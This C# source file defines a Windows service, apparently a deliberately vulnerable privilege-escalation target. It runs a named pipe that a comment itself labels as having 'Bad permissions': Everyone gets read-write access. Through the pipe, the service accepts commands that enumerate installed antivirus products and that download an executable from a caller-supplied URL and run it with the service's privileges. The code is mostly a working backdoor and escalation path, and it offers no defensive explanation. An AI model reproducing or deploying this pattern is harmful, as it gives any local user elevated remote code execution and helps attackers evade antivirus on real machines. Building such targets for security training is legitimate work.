using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Management;
using System.Collections.Generic;
using System.Net;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;

namespace BeaverElevateService
{
    public class NamedPipeServer
    {
        public void Start()
        {
            StreamWriter sw = File.AppendText(@"C:\Windows\Temp\BeaverElevateSvc.txt");
            sw.AutoFlush = true;
            Console.SetError(sw);
            Console.SetOut(sw);
            while (true)
            {
                // Bad permissions
                PipeSecurity pipeSecurity = new PipeSecurity();
                pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));

                using (NamedPipeServerStream pipeServer = new NamedPipeServerStream(
                "BeaverOnThePipe",
                PipeDirection.InOut,
                -1,
                PipeTransmissionMode.Message,
                PipeOptions.Asynchronous,
                0, // InBufferSize
                0, // OutBufferSize
                pipeSecurity))
                {
                    Console.Out.WriteLine("Waiting for a client connection...");
                    pipeServer.WaitForConnection();
                    Console.Out.WriteLine("Client connected.");

                    using (StreamReader reader = new StreamReader(pipeServer))
                    {
                        string request = reader.ReadLine();
                        Console.Out.WriteLine($"Received: {request}");
                        if (request == "enumAV")
                        {
                            try
                            {
                                List<string> avlist = new List<string>();
                                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_AntiVirusProduct");
                                foreach (ManagementObject obj in searcher.Get())
                                {
                                    string displayName = obj["displayName"]?.ToString() ?? "Unknown";
                                    string vendor = obj["vendor"]?.ToString() ?? "Unknown";
                                    avlist.Add($"{vendor} : {displayName}");
                                }
                                Console.Out.WriteLine(String.Join(",", avlist));
                            }
                            catch { }
                        }
                        else if (request.Contains("DownExec"))
                        {
                            try
                            {
                                var args = request.Split(' ');
                                string url = args[1];
                                string cleanurl = url.Remove(url.Length - 2);
                                Task.Run(() => ExecuteInMemory(cleanurl));
                            }
                            catch { }
                        }
                        else if (request == "chaos")
                        {

                        }
                        else { }
                    }
                }
            }
        }

        static void ExecuteInMemory(string downloadLink)
        {
            try
            {
                WebClient webClient = new WebClient();
                byte[] exeBytes = webClient.DownloadData(downloadLink);

                Console.WriteLine("Executing in-memory process...");
                IntPtr processHandle = ExecuteInMemory(exeBytes);

                Console.WriteLine("Waiting for process completion...");
                WaitForSingleObject(processHandle, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static IntPtr ExecuteInMemory(byte[] exeBytes)
        {
            IntPtr processHandle = IntPtr.Zero;

            try
            {
                string tempFilePath = CreateTempFile(exeBytes);

                Console.WriteLine($"Starting process: {tempFilePath}");
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                bool success = CreateProcess(
                    tempFilePath,
                    null,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );

                if (!success)
                {
                    throw new Exception("Error at creating Process. Error: " + Marshal.GetLastWin32Error());
                }

                processHandle = pi.hProcess;
                Console.WriteLine($"Process started with handle: {processHandle}");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return processHandle;
        }

        static string CreateTempFile(byte[] data)
        {
            string tempFilePath = System.IO.Path.GetTempFileName();
            System.IO.File.WriteAllBytes(tempFilePath, data);
            return tempFilePath;
        }

        const uint INFINITE = 0xFFFFFFFF;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
    }
}